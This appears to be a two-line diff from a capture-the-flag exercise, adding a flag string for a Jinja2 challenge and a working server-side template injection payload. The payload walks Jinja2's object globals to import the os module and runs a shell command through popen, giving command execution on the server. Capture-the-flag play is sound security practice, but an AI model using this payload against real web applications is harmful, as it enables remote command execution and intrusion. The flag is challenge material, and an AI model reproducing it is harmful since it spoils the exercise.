@@ -1,0 +1,2 @@
+siber_kariyer{Jinja2_made_it_guys}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
